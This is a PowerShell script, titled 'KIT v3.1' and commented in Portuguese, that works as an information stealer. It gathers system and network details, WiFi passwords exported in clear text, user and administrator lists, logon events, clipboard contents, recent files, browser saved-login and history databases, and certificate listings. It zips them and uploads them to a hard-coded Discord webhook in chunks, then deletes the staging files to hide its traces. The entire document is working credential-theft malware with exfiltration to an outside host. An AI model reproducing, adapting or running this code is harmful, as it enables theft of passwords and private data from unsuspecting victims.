# KIT v3.1 – 8 MB max, PS 7.5.4, sem elevação
$hook="https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"
$kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null

# 1) TXT leves
systeminfo |Out-File $kit\sys.txt -Encoding UTF8
Get-CimInstance Win32_ComputerSystem |Out-File $kit\hw.txt -Encoding UTF8
Get-CimInstance Win32_Processor |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-CimInstance Win32_BIOS |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-NetIPConfiguration |Out-File $kit\net.txt -Encoding UTF8
netsh wlan export profile key=clear folder=$kit |Out-Null
Get-CimInstance Win32_UserAccount |Out-File $kit\usr.txt -Encoding UTF8
net localgroup administradores |Out-File $kit\adm.txt -Encoding UTF8
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0|Select TimeCreated,Message |Out-File $kit\log.txt -Encoding UTF8
Get-Clipboard |Out-File $kit\clip.txt -Encoding UTF8
Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt -Encoding UTF8

# 2) Navegadores
@('Login Data','History','logins.json')| %{
  Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0|Select -First 1| %{
    if(Test-Path $_.FullName){Copy-Item $_.FullName "$kit\$($_.Name)" -EA 0}
  }
}

# 3) Certificados
Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8

# 4) ZIP
Compress-Archive $kit "$kit.zip" -CompressionLevel Optimal

# 5) Corta até 8 MB
$max=8MB
while((Get-Item "$kit.zip").Length -gt $max){
  # remove o maior arquivo ainda presente
  Get-ChildItem $kit -File |Sort Length -Desc|Select -First 1|Remove-Item -Force
  Compress-Archive -Update -Path $kit -DestinationPath "$kit.zip" -CompressionLevel Optimal
}

# 6) Envia – suporta multiplos anexos se ainda exceder
function Send-DiscordSmallFiles {
  param($Files)
  $uri="$hook?wait=true"
  $boundary=[System.Guid]::NewGuid().ToString()
  $lf="`r`n"
  $body=(
    $Files |%{
      "--$boundary$lf"+
      "Content-Disposition: form-data; name=`"file$($Files.IndexOf($_))`"; filename=`"$($_.Name)`"$lf"+
      "Content-Type: application/octet-stream$lf$lf"+
      [System.IO.File]::ReadAllBytes($_.FullName) +
      $lf
    }
  ) -join ''
  $body+= "--$boundary--$lf"
  $bytes=[System.Text.Encoding]::UTF8.GetBytes($body)
  Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
}

$zipItem=Get-Item "$kit.zip"
if($zipItem.Length -le $max){
  Send-DiscordSmallFiles @(,$zipItem)
}else{
  # Particiona em pedaços de 7 MB
  $chunk=7MB
  $reader=[System.IO.File]::OpenRead($zipItem.FullName)
  $part=0
  while($reader.Position -lt $reader.Length){
    $buf=New-Object byte[] $chunk
    $count=$reader.Read($buf,0,$buf.Length)
    $path="$env:TEMP\k_part$part.zip"
    [System.IO.File]::WriteAllBytes($path,$buf[0..($count-1)])
    Send-DiscordSmallFiles (Get-Item $path)
    Remove-Item $path -Force
    $part++
  }
  $reader.Close()
}

# 7) Limpa
Remove-Item $kit -Recurse -Force; Remove-Item "$kit.zip" -Force
